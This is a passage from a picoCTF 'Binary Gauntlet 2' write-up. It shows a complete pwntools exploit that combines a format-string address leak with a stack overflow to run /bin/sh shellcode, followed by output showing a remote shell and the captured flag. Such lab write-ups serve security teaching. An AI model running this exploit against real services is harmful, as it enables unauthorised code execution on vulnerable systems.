#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
io = start()
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    proc.sendline("dummy")
    proc.sendline(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset
overflow_offset = get_overflow_offset()
io = start()
shellcode = shellcraft.sh()
log.info("Shellcode:\n{}".format(shellcode))
io.sendline("%6$p")
if args.LOCAL:
    delta = 0x168
else:
    delta = 0x158
leaked_address = int(io.recvlineS(), 16)
log.info(f"Leaked address: {hex(leaked_address)}")
buffer_address = leaked_address - delta
log.info(f"Local Buffer address: {hex(buffer_address)}")
payload = fit({
     0: asm(shellcode),
     overflow_offset: p64(buffer_address)
})
log.info("Sending payload:\n{}".format(hexdump(payload)))
io.sendline(payload)
io.interactive()
```
Notice the following addition to the script:
```python
if args.LOCAL:
    delta = 0x168
else:
    delta = 0x158
``` 
This was needed since the memory layout on the server was a bit different than the one on the local setup. Therefore, after testing and verifying the full exploit locally, it was easy to run it on the server and experiment with different `delta` values until a shell popped up on the server as well.
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_2]
└─$ python3 exploit.py LOCAL
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet': pid 3138
[+] Starting local process '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet': pid 3142
[*] Process '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet' stopped with exit code -11 (SIGSEGV) (pid 3142)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_2/core.3142'
    Arch:      amd64-64-little
    RIP:       0x400727
    RSP:       0x7ffde464c0f8
    Exe:       '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet' (0x400000)
    Fault:     0x6161616161616170
[*] Overflow offset: 120
[+] Opening connection to mercury.picoctf.net on port 65046: Done
[*] Shellcode:
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
[*] Leaked address: 0x7ffefe850108
[*] Local Buffer address: 0x7ffefe84ffa0
[*] Sending payload:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  a0 ff 84 fe  fe 7f 00 00  │daab│eaab│····│····│
    00000080
[*] Switching to interactive mode
$ ls
flag.txt
gauntlet
xinet_startup.sh
$ cat flag.txt
d509e835331047d80c23c46198350638
```
The flag: `d509e835331047d80c23c46198350638`